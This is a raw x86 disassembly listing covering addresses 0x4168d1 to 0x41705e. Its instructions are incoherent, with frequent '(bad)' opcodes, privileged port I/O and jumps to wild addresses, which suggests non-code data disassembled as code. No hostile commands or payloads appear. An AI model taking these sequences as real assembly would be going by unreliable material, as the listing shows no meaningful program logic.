  4168d1:	dec    edx
  4168d2:	scas   eax,DWORD PTR es:[edi]
  4168d3:	popf   
  4168d4:	mov    ebp,0x6d4b2662
  4168d9:	mov    ecx,0x50863f98
  4168de:	fwait
  4168df:	inc    edx
  4168e0:	xor    al,0xc4
  4168e2:	add    eax,0xd46bfcde
  4168e7:	mov    al,ds:0xac68350d
  4168ec:	aas    
  4168ed:	and    DWORD PTR [edx-0x39],ebx
  4168f0:	je     0x416954
  4168f2:	ds mov esi,0xe3987dab
  4168f8:	inc    esi
  4168f9:	pop    es
  4168fa:	ret    
  4168fb:	mov    esp,0x84461249
  416900:	call   0x4f76423d
  416905:	mov    cs,eax
  416907:	dec    eax
  416908:	call   0xe29075ed
  41690d:	mov    edx,0xb5c84268
  416912:	adc    al,0x85
  416914:	dec    ecx
  416915:	mov    gs,WORD PTR [ecx+0x5be98fe4]
  41691b:	(bad)  
  41691c:	imul   ebx,DWORD PTR [edi+ecx*1+0x40],0x5c
  416921:	cld    
  416922:	dec    esi
  416923:	xor    al,0xa7
  416925:	add    edi,DWORD PTR [ebx]
  416927:	lods   eax,DWORD PTR ds:[esi]
  416928:	call   ecx
  41692a:	mov    al,ds:0x2a524648
  41692f:	bound  ebx,QWORD PTR [eax]
  416931:	jno    0x416916
  416933:	test   al,0xdd
  416935:	and    BYTE PTR [edi+0x453ea4ec],cl
  41693b:	rol    DWORD PTR [ebx-0x6b],1
  41693e:	in     eax,dx
  41693f:	sar    BYTE PTR [edx+0x7a],cl
  416942:	rol    BYTE PTR [ecx+0x74],1
  416945:	je     0x41695c
  416947:	xor    DWORD PTR [esp+edx*4],esp
  41694a:	in     al,0x42
  41694c:	dec    ebx
  41694d:	mov    BYTE PTR [eax],bl
  41694f:	and    eax,0x864c9cb5
  416954:	adc    ebp,DWORD PTR [edx-0x6f]
  416957:	or     BYTE PTR [edi+ebx*1-0x51],bh
  41695b:	aaa    
  41695c:	mov    bh,0x6
  41695e:	test   DWORD PTR [ecx+0x70d12e6e],ecx
  416964:	test   eax,0x4f825767
  416969:	aas    
  41696a:	loope  0x4169e6
  41696c:	sub    eax,0x8ca475b2
  416971:	cld    
  416972:	xor    DWORD PTR [ebx+0x7e],eax
  416975:	inc    edx
  416976:	sbb    cl,0x45
  416979:	push   eax
  41697a:	cld    
  41697b:	jne    0x41698c
  41697d:	pusha  
  41697e:	cmp    dh,BYTE PTR [eax+0x5c8b2cee]
  416984:	dec    eax
  416985:	xadd   DWORD PTR [esi+0x16],eax
  416989:	xchg   ebp,eax
  41698a:	jbe    0x41698b
  41698c:	adc    al,0xca
  41698e:	(bad)  
  41698f:	shr    BYTE PTR [edx],1
  416991:	or     ebp,esp
  416993:	or     BYTE PTR [edx+eax*2],al
  416996:	sti    
  416997:	push   0x46
  416999:	sbb    al,0xf4
  41699b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41699c:	cmp    BYTE PTR [esp+esi*2-0x7d010c9e],bh
  4169a3:	loope  0x4169ba
  4169a5:	inc    edi
  4169a6:	or     eax,0xf32cc2bc
  4169ab:	dec    ebp
  4169ac:	pop    ss
  4169ad:	pop    esp
  4169ae:	ficomp WORD PTR [edi+edx*2]
  4169b1:	xlat   BYTE PTR ds:[ebx]
  4169b2:	sbb    ebp,edx
  4169b4:	(bad)  
  4169b5:	cmp    DWORD PTR [esi-0x71],edi
  4169b8:	mov    ecx,DWORD PTR [edi+0x5f]
  4169bb:	xchg   ecx,eax
  4169bc:	push   ds
  4169bd:	stos   DWORD PTR es:[edi],eax
  4169be:	retf   0x6158
  4169c1:	ds call 0x4e74a55b
  4169c7:	add    ebx,edx
  4169c9:	pop    edi
  4169ca:	js     0x416a38
  4169cc:	shr    BYTE PTR [ebx-0x30],cl
  4169cf:	xor    dl,bl
  4169d1:	test   eax,0x95f0816
  4169d6:	inc    edi
  4169d7:	adc    al,0xb8
  4169d9:	test   ch,dh
  4169db:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4169dc:	out    0x5e,al
  4169de:	mov    ch,0xcc
  4169e0:	nop
  4169e1:	retf   0xa8c1
  4169e4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4169e5:	mov    al,0x41
  4169e7:	jae    0x41698e
  4169e9:	ds sbb al,0x81
  4169ec:	or     edx,DWORD PTR [edx+0x341046f3]
  4169f2:	sbb    BYTE PTR [edi],bl
  4169f4:	loope  0x416a6a
  4169f6:	test   DWORD PTR [ecx-0x4f04e0cf],0x5b8ed0b3
  416a00:	(bad)  [edx+0xb]
  416a03:	fwait
  416a04:	test   eax,0x5193982b
  416a09:	push   ds
  416a0a:	xlat   BYTE PTR ds:[ebx]
  416a0b:	fdivr  QWORD PTR [ebp-0x2b]
  416a0e:	fnsave [eax+0x31]
  416a11:	iret   
  416a12:	pop    ebp
  416a13:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416a14:	stos   BYTE PTR es:[edi],al
  416a15:	inc    ebp
  416a16:	popf   
  416a17:	push   eax
  416a18:	pop    ss
  416a19:	enter  0x4d46,0xc4
  416a1d:	adc    BYTE PTR [ebp-0x37919a34],ch
  416a23:	xchg   ecx,eax
  416a24:	pop    ds
  416a25:	mov    ds:0x73e1c097,al
  416a2a:	jno    0x4169c3
  416a2c:	popf   
  416a2d:	stos   DWORD PTR es:[edi],eax
  416a2e:	pop    DWORD PTR [ecx+0x643bf78a]
  416a34:	jg     0x416aa4
  416a36:	jbe    0x416ab0
  416a38:	jb     0x416a09
  416a3a:	xlat   BYTE PTR ds:[ebx]
  416a3b:	mov    esp,0x6f43e355
  416a40:	ins    BYTE PTR es:[edi],dx
  416a41:	(bad)  
  416a42:	and    esp,DWORD PTR [eax-0x5acc115d]
  416a48:	sub    ebx,DWORD PTR [esi+0xf]
  416a4b:	enter  0x9222,0x60
  416a4f:	dec    ecx
  416a50:	mov    al,0x3a
  416a52:	inc    eax
  416a53:	dec    edi
  416a54:	inc    ebx
  416a55:	xor    eax,0xac8fef3c
  416a5a:	and    edi,DWORD PTR fs:[esi]
  416a5d:	das    
  416a5e:	push   eax
  416a5f:	loope  0x416ace
  416a61:	sbb    ebx,ebx
  416a63:	mov    ebp,0xd3b2c2f1
  416a68:	xor    BYTE PTR [eax+0x54],ah
  416a6b:	or     BYTE PTR [ecx],bh
  416a6d:	jae    0x416a4c
  416a6f:	jns    0x416a66
  416a71:	push   eax
  416a72:	repnz sbb al,0x76
  416a75:	nop
  416a76:	das    
  416a77:	loopne 0x416abe
  416a79:	mov    DWORD PTR [esi+0x58cb616c],edx
  416a7f:	add    esp,ecx
  416a81:	rcr    BYTE PTR [eax],0xb3
  416a84:	in     al,dx
  416a85:	rol    BYTE PTR [ecx],cl
  416a87:	test   BYTE PTR [ebp-0x5d811f04],0xb0
  416a8e:	aam    0x22
  416a90:	in     eax,0xbf
  416a92:	cli    
  416a93:	repz sbb al,0xdb
  416a96:	ss sub BYTE PTR es:0xe29532ee,bh
  416a9e:	sti    
  416a9f:	in     eax,0x3f
  416aa1:	or     ebp,DWORD PTR [edx]
  416aa3:	inc    ebx
  416aa4:	ret    0x8d4d
  416aa7:	pop    ss
  416aa8:	aas    
  416aa9:	rcl    DWORD PTR cs:[ecx+edx*4],cl
  416aad:	jne    0x416b02
  416aaf:	jno    0x416aee
  416ab1:	add    dl,BYTE PTR [edi+ebx*4]
  416ab4:	and    dh,BYTE PTR [eax+edi*4]
  416ab7:	jb     0x416a70
  416ab9:	inc    ecx
  416aba:	jnp    0x416b05
  416abc:	xchg   edx,eax
  416abd:	loop   0x416b1e
  416abf:	ss jb  0x416a49
  416ac2:	fdivr  QWORD PTR [edi]
  416ac4:	mov    edx,0x7739808e
  416ac9:	fist   DWORD PTR [edx+eiz*2-0x22]
  416acd:	sti    
  416ace:	push   0x875e26fa
  416ad3:	(bad)  
  416ad4:	jecxz  0x416b4c
  416ad6:	xchg   ebp,eax
  416ad7:	lds    esi,FWORD PTR [eax+0x23755994]
  416add:	jge    0x416b07
  416adf:	fwait
  416ae0:	mul    BYTE PTR [ebx]
  416ae2:	jb     0x416b43
  416ae4:	mov    ebp,0x25d215be
  416ae9:	pop    esi
  416aea:	mov    ebp,0x825c7b8a
  416aef:	inc    edi
  416af0:	ret    
  416af1:	bound  eax,QWORD PTR [edi+0x6a]
  416af4:	and    al,0x1b
  416af6:	jecxz  0x416a79
  416af8:	mov    cl,0x80
  416afa:	mov    cl,0x48
  416afc:	jb     0x416b18
  416afe:	xchg   edx,eax
  416aff:	push   ebp
  416b00:	or     eax,0x24ef63b5
  416b05:	push   es
  416b06:	sub    ebx,DWORD PTR [edx+eax*2+0x7250013a]
  416b0d:	push   eax
  416b0e:	out    0x19,eax
  416b10:	inc    edx
  416b11:	mov    WORD PTR [edi-0x5d],?
  416b14:	mov    ebp,0xa3ba3923
  416b19:	mov    ds,WORD PTR [ecx+0x5f]
  416b1c:	add    BYTE PTR cs:[esi+0x2d],dh
  416b20:	pushf  
  416b21:	pushf  
  416b22:	lock stos BYTE PTR es:[edi],al
  416b24:	and    BYTE PTR [edx],dh
  416b26:	jmp    0x643d41ac
  416b2b:	imul   edi,edx,0x32
  416b2e:	push   ebp
  416b2f:	int3   
  416b30:	sbb    al,al
  416b32:	mov    dh,0x61
  416b34:	std    
  416b35:	xchg   esp,eax
  416b36:	add    BYTE PTR [ecx+0x7558bcd8],bl
  416b3c:	not    dh
  416b3e:	xchg   ecx,eax
  416b3f:	inc    esp
  416b40:	inc    eax
  416b41:	lock jmp 0x254f:0xdc73432e
  416b49:	addr16 ret 
  416b4b:	xlat   BYTE PTR ds:[ebx]
  416b4c:	dec    esp
  416b4d:	and    DWORD PTR [ecx],0x15a5e661
  416b53:	xchg   esp,eax
  416b54:	fistp  QWORD PTR [edx+0x50404380]
  416b5a:	test   eax,0xd6bdf9e0
  416b5f:	scas   eax,DWORD PTR es:[edi]
  416b60:	mov    bh,0x59
  416b62:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416b63:	inc    esi
  416b64:	cmp    esp,ebx
  416b66:	test   BYTE PTR [edi+0x31],bl
  416b69:	in     eax,dx
  416b6a:	cdq    
  416b6b:	push   cs
  416b6c:	dec    esi
  416b6d:	cmp    al,BYTE PTR [edx+0x2e]
  416b70:	mov    edx,0x4ebc5b55
  416b75:	mov    bh,0x60
  416b77:	mov    cl,0xc8
  416b79:	popa   
  416b7a:	xchg   esi,eax
  416b7b:	ss push es
  416b7d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416b7e:	nop
  416b7f:	xor    BYTE PTR [edi+0x4de95a62],0x25
  416b86:	mov    ch,0x4b
  416b88:	cmp    al,0x55
  416b8a:	cmp    BYTE PTR [esi-0x46],cl
  416b8d:	mov    al,ds:0xf9975dc2
  416b92:	or     al,0x93
  416b95:	push   0xe63a273d
  416b9a:	sbb    al,0x51
  416b9c:	mov    edx,0xbe5529dc
  416ba1:	lea    ecx,[eax+eax*1]
  416ba4:	adc    eax,0xbff832f6
  416ba9:	int3   
  416baa:	pop    ebx
  416bab:	jne    0x416c06
  416bad:	enter  0x10df,0x69
  416bb1:	mov    eax,ds:0x3e063e1a
  416bb6:	sbb    al,0x9d
  416bb8:	pop    ebx
  416bb9:	test   eax,0x7ab67dec
  416bbe:	push   ss
  416bbf:	cli    
  416bc0:	xor    eax,0xb696d1e9
  416bc5:	inc    edx
  416bc6:	jb     0x416b8e
  416bc8:	jmp    0xb0d7056c
  416bcd:	cmp    bh,BYTE PTR [ebx+0x4]
  416bd0:	mov    dl,0x77
  416bd2:	into   
  416bd3:	imul   ebx,ebp,0xffffff81
  416bd6:	mov    ebx,esi
  416bd8:	lods   al,BYTE PTR ds:[esi]
  416bd9:	fnstcw WORD PTR [esi+esi*8-0x7c73173]
  416be0:	dec    esp
  416be1:	jmp    0x6664806b
  416be6:	push   0x115c2fca
  416beb:	stos   BYTE PTR es:[edi],al
  416bec:	sbb    eax,0xe8fd65ce
  416bf1:	sbb    DWORD PTR [edi],ebx
  416bf3:	add    al,0xb0
  416bf5:	pop    esi
  416bf6:	stos   BYTE PTR es:[edi],al
  416bf7:	push   ecx
  416bf8:	mov    dh,0x2f
  416bfa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416bfb:	adc    BYTE PTR [edx*4-0x24fe6954],0xd9
  416c03:	sbb    eax,0x721032e6
  416c08:	stc    
  416c09:	cwde   
  416c0a:	xor    bh,bl
  416c0c:	pop    ebp
  416c0d:	popf   
  416c0e:	lock push esp
  416c10:	rcr    DWORD PTR [eax-0x428c9513],cl
  416c16:	clc    
  416c17:	js     0x416c46
  416c19:	ret    
  416c1a:	ret    
  416c1b:	nop
  416c1c:	aad    0x7b
  416c1e:	retf   
  416c1f:	mov    bl,ah
  416c21:	mov    eax,edx
  416c23:	in     eax,dx
  416c24:	jo     0x416c69
  416c26:	pop    esp
  416c27:	loopne 0x416bca
  416c29:	int3   
  416c2a:	cmp    BYTE PTR [eax+0x1525e37f],0x3
  416c31:	out    0x98,eax
  416c33:	cs xor eax,0x6681f27
  416c39:	aam    0x57
  416c3b:	jns    0x416ca3
  416c3d:	cmp    ah,BYTE PTR [ecx]
  416c3f:	cmc    
  416c40:	std    
  416c41:	pusha  
  416c42:	dec    ebx
  416c43:	in     al,0xe0
  416c45:	mov    edx,0xb4cc3616
  416c4a:	cmp    ch,BYTE PTR [ebp-0x78]
  416c4d:	xor    al,0x2f
  416c4f:	sbb    esp,esp
  416c51:	sti    
  416c52:	jmp    0x416bf2
  416c54:	popf   
  416c55:	push   edi
  416c56:	imul   edi,DWORD PTR ds:0x1732078a,0x6d
  416c5d:	loopne 0x416c03
  416c5f:	loop   0x416cdc
  416c61:	mov    edx,0x80ceed70
  416c66:	adc    al,BYTE PTR ss:[esi-0x6c779e7f]
  416c6d:	jbe    0x416c8b
  416c6f:	scas   eax,DWORD PTR es:[edi]
  416c70:	outs   dx,BYTE PTR ds:[esi]
  416c71:	lea    esp,[ebp-0x3]
  416c74:	mov    edx,0xa91c04d5
  416c79:	jne    0x416c48
  416c7b:	mov    al,ds:0xedee630
  416c80:	sub    BYTE PTR [ecx+esi*2+0x352b9bfe],bl
  416c87:	dec    ecx
  416c88:	inc    ebp
  416c89:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416c8a:	pop    ecx
  416c8b:	cs ds mov bh,0x85
  416c8f:	imul   BYTE PTR [ecx]
  416c91:	arpl   WORD PTR [esi+0x59],ax
  416c94:	pusha  
  416c95:	stos   BYTE PTR es:[edi],al
  416c96:	jo     0x416cf9
  416c98:	jae    0x416c90
  416c9a:	jae    0x416c4b
  416c9c:	mov    al,ds:0xa1b490df
  416ca1:	fsubp  st(6),st
  416ca3:	out    dx,al
  416ca4:	inc    ebp
  416ca5:	test   BYTE PTR [ecx-0x4e],0xaa
  416ca9:	pop    edx
  416caa:	call   0x22e8d20c
  416caf:	icebp  
  416cb0:	push   ss
  416cb1:	lds    ecx,FWORD PTR [eax]
  416cb3:	ret    0xa3e1
  416cb6:	loope  0x416ce6
  416cb8:	push   0x3f
  416cba:	cmp    BYTE PTR [eax+edi*2],bh
  416cbd:	adc    dl,BYTE PTR [edi]
  416cbf:	mov    edi,?
  416cc1:	stos   DWORD PTR es:[edi],eax
  416cc2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416cc3:	shr    BYTE PTR [ecx],1
  416cc5:	jns    0x416d1a
  416cc7:	sti    
  416cc8:	fcomp  QWORD PTR [edx+esi*4]
  416ccb:	adc    DWORD PTR [ecx-0x1b0fa2e0],ecx
  416cd1:	sub    dh,0x52
  416cd4:	idiv   DWORD PTR [esi+0x6b]
  416cd7:	mov    cs,WORD PTR [esi+0x7e]
  416cda:	popa   
  416cdb:	add    BYTE PTR [edi-0x6f],ch
  416cde:	stos   BYTE PTR es:[edi],al
  416cdf:	cdq    
  416ce0:	repnz pop ecx
  416ce2:	jp     0x416c9c
  416ce4:	mov    ds:0x2e857adc,eax
  416ce9:	ins    BYTE PTR es:[edi],dx
  416cea:	pop    esi
  416ceb:	mov    al,ds:0x4f96bd2d
  416cf0:	xchg   BYTE PTR ds:0xb7e183ea,bh
  416cf6:	aam    0xa4
  416cf8:	jae    0x416cee
  416cfa:	pop    edi
  416cfb:	mov    al,ds:0x982283df
  416d00:	mov    BYTE PTR [edx],bl
  416d02:	xor    eax,0x6a4c7eb6
  416d07:	mov    bl,0xe0
  416d09:	sbb    al,0xb9
  416d0b:	std    
  416d0c:	lods   eax,DWORD PTR ds:[esi]
  416d0d:	ins    DWORD PTR es:[edi],dx
  416d0e:	sub    DWORD PTR [edi+0x6f9c929e],eax
  416d14:	ja     0x416cef
  416d16:	sti    
  416d17:	dec    esp
  416d18:	mov    ch,0x39
  416d1a:	mov    cl,0xc0
  416d1c:	repnz push esp
  416d1e:	mov    bh,0x47
  416d20:	aas    
  416d21:	bound  esp,QWORD PTR [ecx]
  416d23:	test   ch,al
  416d25:	mov    ch,0xaa
  416d27:	lods   al,BYTE PTR ds:[esi]
  416d28:	dec    ebp
  416d29:	mov    ebp,0x71c2a703
  416d2e:	cdq    
  416d2f:	push   ecx
  416d30:	cld    
  416d31:	outs   dx,DWORD PTR ds:[esi]
  416d32:	jne    0x416ce0
  416d34:	stos   DWORD PTR es:[edi],eax
  416d35:	shr    DWORD PTR [edx],0xc0
  416d38:	in     al,0x1
  416d3a:	loopne 0x416d26
  416d3c:	and    bh,BYTE PTR [ebp+0x3528476f]
  416d42:	out    0xa3,al
  416d44:	mov    bl,0xab
  416d46:	in     al,dx
  416d47:	push   0x4653d128
  416d4c:	pusha  
  416d4d:	outs   dx,DWORD PTR ss:[esi]
  416d4f:	lock stc 
  416d51:	jle    0x416d4d
  416d53:	inc    ebp
  416d54:	and    bh,BYTE PTR [ecx]
  416d56:	imul   ecx,ebp,0x346df2c8
  416d5c:	rcl    DWORD PTR [ebx-0x295e61dc],cl
  416d62:	ja     0x416d02
  416d64:	lds    ebx,FWORD PTR [edi+0x6]
  416d67:	das    
  416d68:	jmp    0xb975c98d
  416d6d:	aad    0xc4
  416d6f:	inc    eax
  416d70:	cmp    eax,0xa8576ae0
  416d75:	loope  0x416d74
  416d77:	mov    ebp,0x1e95dddc
  416d7c:	ds repz mov ebx,0xa2ccde25
  416d84:	(bad)  
  416d85:	mov    bh,0x5d
  416d87:	push   ecx
  416d88:	push   ebx
  416d89:	shl    BYTE PTR [ebp+0x66],cl
  416d8c:	push   esi
  416d8d:	or     DWORD PTR [ecx+0x59],esi
  416d90:	sub    DWORD PTR [ebx+0x16],esi
  416d93:	hlt    
  416d94:	xchg   edx,eax
  416d95:	inc    ebx
  416d96:	dec    esp
  416d97:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416d98:	in     al,dx
  416d99:	mov    ebx,0x1906c724
  416d9e:	dec    ecx
  416d9f:	mov    ebx,0x9a1c5ce
  416da4:	lea    ebp,[eax+0x4f38b71]
  416daa:	jl     0x416d3d
  416dac:	push   eax
  416dad:	and    ah,BYTE PTR es:[ecx]
  416db0:	mov    esi,DWORD PTR [ebx+esi*8]
  416db3:	pushf  
  416db4:	xchg   ebp,eax
  416db5:	aas    
  416db6:	aam    0x91
  416db8:	imul   edx,ebp,0x46124ace
  416dbe:	neg    DWORD PTR [edi+ebx*1]
  416dc1:	mov    al,ds:0x67584f45
  416dc6:	push   edi
  416dc7:	pop    esp
  416dc8:	cmp    DWORD PTR [ecx+eiz*1],0x9e7c2eb9
  416dcf:	cmp    BYTE PTR [edi+ebp*8+0x2b],dh
  416dd3:	retf   
  416dd4:	add    al,0x1d
  416dd6:	xor    eax,0xfeabf668
  416ddb:	pop    ecx
  416ddc:	leave  
  416ddd:	je     0x416dcf
  416ddf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416de0:	jb     0x416d6f
  416de2:	ret    
  416de3:	pusha  
  416de4:	push   edx
  416de5:	mov    cl,0x66
  416de7:	sbb    al,0xf5
  416de9:	xchg   edx,eax
  416dea:	test   al,0xdd
  416dec:	inc    edx
  416ded:	shl    DWORD PTR [ebp+0x3fe7bc73],cl
  416df3:	adc    dl,al
  416df5:	outs   dx,DWORD PTR ds:[esi]
  416df6:	sub    eax,0x3f6f5400
  416dfb:	(bad)  
  416dfc:	imul   edi,DWORD PTR [eax],0xffffffa0
  416dff:	ins    BYTE PTR es:[edi],dx
  416e00:	xor    al,0xb8
  416e02:	jae    0x416e5f
  416e04:	(bad)  
  416e05:	scas   al,BYTE PTR es:[edi]
  416e06:	inc    ebx
  416e07:	or     ah,cl
  416e09:	push   esp
  416e0a:	aad    0x68
  416e0c:	xor    al,ah
  416e0e:	jl     0x416e7b
  416e10:	out    0xae,eax
  416e12:	mov    ch,0x99
  416e14:	retf   0xadac
  416e17:	jae    0x416db1
  416e19:	xchg   ebx,eax
  416e1a:	sbb    DWORD PTR [edx-0x43e73be],eax
  416e20:	aam    0x51
  416e22:	sbb    dh,BYTE PTR [esi+0xf]
  416e25:	mov    dh,0x42
  416e27:	out    0x44,al
  416e29:	mov    al,0xe1
  416e2b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416e2c:	retf   
  416e2d:	push   es
  416e2e:	leave  
  416e2f:	push   0xffffffa1
  416e31:	imul   ebx,edi,0xffffffd7
  416e34:	xor    edx,ebp
  416e36:	jmp    0x9fc44891
  416e3b:	xor    DWORD PTR [ecx+edx*8],0x32
  416e3f:	inc    eax
  416e40:	repz cwd 
  416e43:	test   al,0xf0
  416e45:	xcrypt-cbc (bad)
  416e46:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416e47:	adc    esi,eax
  416e49:	xor    eax,0xcfe31139
  416e4e:	inc    ecx
  416e4f:	int3   
  416e50:	mov    bl,0xc6
  416e52:	out    0x3b,eax
  416e54:	fwait
  416e55:	cmp    bl,BYTE PTR [ecx+0x2bcdce36]
  416e5b:	retf   
  416e5c:	lods   eax,DWORD PTR ds:[esi]
  416e5d:	and    DWORD PTR [ecx-0x18ee4f6d],0x8da48966
  416e67:	or     eax,0x4af6881
  416e6c:	ins    BYTE PTR es:[edi],dx
  416e6d:	retf   0x9710
  416e70:	daa    
  416e71:	push   ss
  416e72:	add    eax,0xbfecdade
  416e77:	push   ebx
  416e78:	cmp    eax,0xe4c6e7ab
  416e7d:	xchg   esp,eax
  416e7e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416e7f:	lds    ebx,FWORD PTR [ebp+0x23739074]
  416e85:	pop    esp
  416e86:	pop    edi
  416e87:	pop    ebp
  416e88:	arpl   WORD PTR [edx-0x49],bp
  416e8b:	dec    edi
  416e8c:	retf   
  416e8d:	push   0xf13c01fe
  416e92:	test   eax,0x9f8f82e9
  416e97:	xchg   ecx,eax
  416e98:	leave  
  416e99:	rol    ebx,0x5a
  416e9c:	xchg   esi,eax
  416e9d:	enter  0x2529,0xf9
  416ea1:	jl     0x416eb7
  416ea3:	test   eax,0x4ebd35e
  416ea8:	sub    al,0x60
  416eaa:	sub    ebp,ecx
  416eac:	mov    esp,DWORD PTR [edx]
  416eae:	pop    esi
  416eaf:	adc    al,0x22
  416eb1:	dec    ebx
  416eb2:	test   DWORD PTR [eax-0x11],esp
  416eb5:	adc    BYTE PTR [edx-0x1b],bh
  416eb8:	sub    bh,BYTE PTR [eax+0x3f]
  416ebb:	mov    ebp,0x68fecf9d
  416ec0:	pop    ss
  416ec1:	push   ds
  416ec2:	pop    ss
  416ec3:	adc    eax,0x13efb870
  416ec8:	ins    BYTE PTR es:[edi],dx
  416ec9:	cmp    BYTE PTR [esi-0x67],0xbe
  416ecd:	fwait
  416ece:	div    BYTE PTR [ecx-0x10]
  416ed1:	xor    al,0x12
  416ed3:	mov    ebp,0xa0e4acd1
  416ed8:	and    al,0x76
  416eda:	fcomp  QWORD PTR [eax-0x358dcafc]
  416ee0:	inc    edx
  416ee1:	sbb    BYTE PTR [eax+0x13],0x0
  416ee5:	test   eax,0x53f753bf
  416eea:	xchg   BYTE PTR [eax+0x3be30df],bh
  416ef0:	fstp   QWORD PTR [esp+esi*2+0x35]
  416ef4:	mov    esi,0x5db6a997
  416ef9:	adc    dl,ch
  416efb:	gs stos DWORD PTR es:[edi],eax
  416efd:	or     al,0xde
  416eff:	mov    WORD PTR [eax-0x30],ss
  416f02:	cmp    BYTE PTR [ebp-0x2b],dh
  416f05:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416f06:	ins    BYTE PTR es:[edi],dx
  416f07:	adc    eax,0x79f37d94
  416f0c:	not    BYTE PTR [ecx]
  416f0e:	xor    BYTE PTR [ecx-0x795cd8b0],ah
  416f14:	or     BYTE PTR [esi],0x33
  416f17:	shl    DWORD PTR [ebp+0x50e1b28],cl
  416f1d:	mov    bl,0x7e
  416f1f:	sub    dh,BYTE PTR [edi+0xd]
  416f22:	adc    esp,0xffffff95
  416f25:	pushf  
  416f26:	inc    esi
  416f27:	mov    al,0x7d
  416f29:	pusha  
  416f2a:	inc    eax
  416f2b:	xchg   dl,ch
  416f2d:	push   edx
  416f2e:	sbb    dh,BYTE PTR [esi]
  416f30:	and    eax,0xd5b7e53b
  416f35:	adc    eax,edx
  416f37:	hlt    
  416f38:	dec    ebx
  416f39:	lods   eax,DWORD PTR ds:[esi]
  416f3a:	(bad)  
  416f3b:	aas    
  416f3c:	adc    esp,edx
  416f3e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416f3f:	dec    esi
  416f40:	ja     0x416ed2
  416f42:	aaa    
  416f43:	mov    dh,0x95
  416f45:	sbb    DWORD PTR [esi],edi
  416f47:	mov    ecx,0xc2527d6a
  416f4c:	arpl   WORD PTR [ecx-0x1d072fdc],si
  416f52:	js     0x416f40
  416f54:	sar    DWORD PTR [ebx],0xc0
  416f57:	sub    ch,BYTE PTR [eax]
  416f59:	test   BYTE PTR [esi+0x18ece2b7],cl
  416f5f:	fcmovnbe st,st(3)
  416f61:	nop
  416f62:	lahf   
  416f63:	jno    0x416f27
  416f65:	and    DWORD PTR [ebx+0x3d34f38d],0xde472c0f
  416f6f:	ret    
  416f70:	mov    ds:0xc783d95d,eax
  416f75:	imul   ecx,esp,0xc463ada
  416f7b:	das    
  416f7c:	jecxz  0x416ff3
  416f7e:	int    0xb
  416f80:	not    DWORD PTR [eax+0x15f953f5]
  416f86:	test   al,ah
  416f88:	pop    ebp
  416f89:	fst    QWORD PTR [ebx-0x18]
  416f8c:	cli    
  416f8d:	mov    esp,0x33eb933a
  416f92:	out    dx,eax
  416f93:	in     eax,0x3d
  416f95:	mov    edx,0xf4f84069
  416f9a:	out    0xca,al
  416f9c:	lds    edi,FWORD PTR [ebx]
  416f9e:	xchg   ebx,eax
  416f9f:	mov    edi,0x4463bf04
  416fa4:	inc    esi
  416fa5:	mov    ebx,0xbc3e8d9
  416faa:	jl     0x417020
  416fac:	xchg   DWORD PTR [ecx-0x22],ebx
  416faf:	test   BYTE PTR [edx],0xa8
  416fb2:	nop
  416fb3:	mov    eax,0x870527d3
  416fb8:	cs dec ebp
  416fba:	retf   
  416fbb:	jecxz  0x417004
  416fbd:	imul   DWORD PTR [esi+0x5c86ee2a]
  416fc3:	retf   
  416fc4:	pop    esi
  416fc5:	push   ecx
  416fc6:	xor    BYTE PTR [eax+0x4a],0xcb
  416fca:	mov    esi,0x956b0b7b
  416fcf:	sub    bl,BYTE PTR [ebx-0x69e6f652]
  416fd5:	mov    ds,WORD PTR [ecx-0x45]
  416fd8:	mov    dh,0xff
  416fda:	inc    eax
  416fdb:	mov    cs,WORD PTR [edi+0x4dbb8399]
  416fe1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416fe2:	ror    DWORD PTR [ecx-0x73],cl
  416fe5:	jns    0x416f7f
  416fe7:	pushf  
  416fe8:	xchg   DWORD PTR [ecx-0x1e],edx
  416feb:	in     al,0x38
  416fed:	mov    edi,0xb9638ad4
  416ff2:	pop    esp
  416ff3:	outs   dx,BYTE PTR ds:[esi]
  416ff4:	not    BYTE PTR [ecx]
  416ff6:	add    ah,BYTE PTR [ebx+0xb4107b3]
  416ffc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416ffd:	jg     0x416fb0
  416fff:	sti    
  417000:	ins    BYTE PTR es:[edi],dx
  417001:	sub    al,0xc7
  417003:	rcl    DWORD PTR [eax],0xb8
  417006:	imul   BYTE PTR [ecx]
  417008:	(bad)  
  417009:	outs   dx,DWORD PTR ds:[esi]
  41700a:	or     ebx,DWORD PTR [edi-0x4f]
  41700d:	xor    eax,0xdba5c60d
  417012:	inc    esp
  417013:	jge    0x416fee
  417015:	jl     0x416fd0
  417017:	push   edi
  417018:	xchg   esi,eax
  417019:	call   0x2e2c:0xac362155
  417020:	mov    ecx,0xcb07bb80
  417025:	stos   DWORD PTR es:[edi],eax
  417026:	fisub  WORD PTR [ebx-0x474d9b4b]
  41702c:	mov    edi,0xa21014c9
  417031:	and    eax,0x765b2707
  417036:	int    0x88
  417038:	sub    eax,DWORD PTR [ebp+0x63]
  41703b:	or     al,BYTE PTR [ecx]
  41703d:	xchg   ebx,eax
  41703e:	aad    0xc2
  417040:	inc    ebx
  417041:	into   
  417042:	xchg   ecx,eax
  417043:	pop    es
  417044:	push   edi
  417045:	lea    edi,[ebp+esi*2-0x58b0f222]
  41704c:	enter  0xa20b,0x5c
  417050:	in     eax,0x78
  417052:	cmp    edi,ebp
  417054:	inc    eax
  417055:	cmp    cl,BYTE PTR [ebx]
  417057:	shl    ch,cl
  417059:	fs jb  0x417060
  41705c:	stc    
  41705d:	stos   BYTE PTR es:[edi],al
  41705e:	xchg   esi,eax
